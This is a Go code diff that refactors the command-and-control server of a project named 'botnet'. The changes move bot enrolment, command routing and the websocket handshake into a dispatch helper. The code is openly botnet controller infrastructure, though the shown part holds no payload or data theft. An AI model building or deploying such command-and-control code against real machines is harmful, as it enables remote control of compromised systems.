@@ -9,7 +9,6 @@ import (
 	"github.com/adrianosela/botnet/command-and-control/ccworker"
 	"github.com/adrianosela/botnet/lib/encryption"
 	"github.com/adrianosela/botnet/lib/protocol"
-	"github.com/gorilla/websocket"
 )
 
 // CommandAndControl is the command and control - controller
@@ -50,19 +49,14 @@ func (cc *CommandAndControl) StartBotnet() {
 // EnrolBot registers a bot to the botnet
 func (cc *CommandAndControl) EnrolBot(bot *ccworker.BotWorker) {
 	cc.bots[bot.ID] = bot
-	bot.Start()
 	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
-	// let bot know enrolment succeeded
-	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
-	log.Printf("[cmd&ctrl] pinging bot %s...", bot.ID)
-	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypePing}
 }
 
 // ReleaseBot de registers a bot from a botnet
 func (cc *CommandAndControl) ReleaseBot(id string) {
 	if bot, ok := cc.bots[id]; ok {
 		delete(cc.bots, id)
-		close(bot.CommandChan)
+		bot.GreafulShutdown()
 	}
 	log.Printf("[cmd&ctrl] bot %s left net", id)
 }
@@ -90,7 +84,7 @@ func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
 // SendCommandToBot sends a command to only one given bot
 func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
 	select {
-	case cc.bots[id].CommandChan <- cmd:
+	case cc.bots[id].CmdOutChan <- cmd:
 	default:
 		cc.ReleaseBot(id)
 	}
@@ -111,26 +105,12 @@ func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Reque
 
 // CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
 func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	// upgrade protocol to websockets connection
-	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
-	conn, err := upgrader.Upgrade(w, r, nil)
+	bot, err := ccworker.DispatchNewBot(w, r, cc.msgDecryptKey, cc.recvMsgChan)
 	if err != nil {
-		w.WriteHeader(http.StatusInternalServerError)
-		w.Write([]byte("could not upgrade to WS connection"))
+		w.WriteHeader(http.StatusTeapot)
+		w.Write([]byte(":("))
+		log.Printf(" [cmd&ctrl] there was a failed bot dispatch for %s: %s", r.RemoteAddr, r.UserAgent())
 		return
 	}
-	// receive public key from bot handshake
-	botPubKey, err := protocol.BotHandshake(conn, cc.msgDecryptKey)
-	if err != nil {
-		log.Printf("received join request but failed to complete net handshake: %s", err)
-		return
-	}
-	// create new bot bontroller
-	botController, err := ccworker.NewBotWorker(cc.msgDecryptKey, botPubKey, conn, cc.recvMsgChan)
-	if err != nil {
-		log.Printf("could not create new slave controller for new slave: %s", err)
-		return
-	}
-	// add to net and start socket handlers
-	cc.EnrolBot(botController)
+	cc.EnrolBot(bot)
 }
